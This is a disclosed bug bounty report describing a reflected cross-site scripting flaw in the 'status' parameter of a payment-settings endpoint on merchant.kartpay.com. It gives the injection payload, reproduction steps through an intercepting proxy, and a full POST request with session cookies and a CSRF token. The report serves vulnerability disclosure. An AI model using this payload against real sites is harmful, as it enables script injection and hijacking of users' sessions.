# Reflected XSS on https://merchant.kartpay.com/payment_settings [status]

## Report Details
- **Report ID**: 643537
- **URL**: https://hackerone.com/reports/643537
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-07-15T13:08:54.755Z
- **Disclosed**: 2019-08-28T15:27:54.390Z

## Reporter
- **Username**: august1808
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kartpay

## Vulnerability Information
#Vulnerable URL
https://merchant.kartpay.com/payment_settings/type

#Parameter
``status``

#Payload
```"><img src=x onerror=alert(domain)>```

#Steps to Reproduce
1. Login with your credentials.
2. Go to https://merchant.kartpay.com/payment_settings
3. Start Burp suite proxy and intercept on.
4. Click on Run and Save button. intercept the request.
5. Enter above payload in vulnerable parameter.
6. Right click Show response in browser. 
7. You will notice that xss will execute. 

#POST Request

```
POST /payment_settings/type HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/payment_settings
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: XGf5lqENEGvobu7MFdK2LfgtUoYZ2Hl6JWwYMLOV
X-Requested-With: XMLHttpRequest
Content-Length: 73
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IkIyMkNoakFhYVVpdmFtalJUc3JZWlE9PSIsInZhbHVlIjoiYTg1TlZFeUZLNzUxaVJoOXZyV1gxSWhZaEh5eTRuWENMRXJLR05tZGZMUVRUQ2ozTWgwbG1IMUlFZ0JxcVk5ZyIsIm1hYyI6IjNhZTI4ODM0YWY3YzM5N2JhZDEzMGE1NjdiODZhZWU4ZWM4YjI1ZjhjYmJhMWNhZGFlYTdkMmQ4OTRhMmRmNDcifQ%3D%3D; laravel_session=eyJpdiI6IlZuRkhIWmMxbFU2ZFArR3lVc1hFM1E9PSIsInZhbHVlIjoiXC9KSFZhVlV4YWpSNWR2YjlFS1F0STF5QTVYMTh3Y1ZNN1hWY2RhZnAxRFArXC9KT2FmUG01UldVR3dYTHdYWE03IiwibWFjIjoiOWMyYzJlY2MwYjY2NDkyMTkxZDhlOGE4Njk0N2QwYTdkNjFkMjRlZWNlNDBjNTc3MmZiYjg5YTI1Yjc4NTkxNiJ9; _ga=GA1.2.1275163119.1563193948; _gid=GA1.2.1455926951.1563193948

merchant_id=729&type_id=5&status=false"><img src=x onerror=alert(cookie)>
```
{F529602}
{F529603}
{F529604}
{F529605}

## Impact

with the help of this attack, an attacker can execute malicious javascript on an application

## Attachments
- 1.png
- 2.png
- 3.png
- 4.png
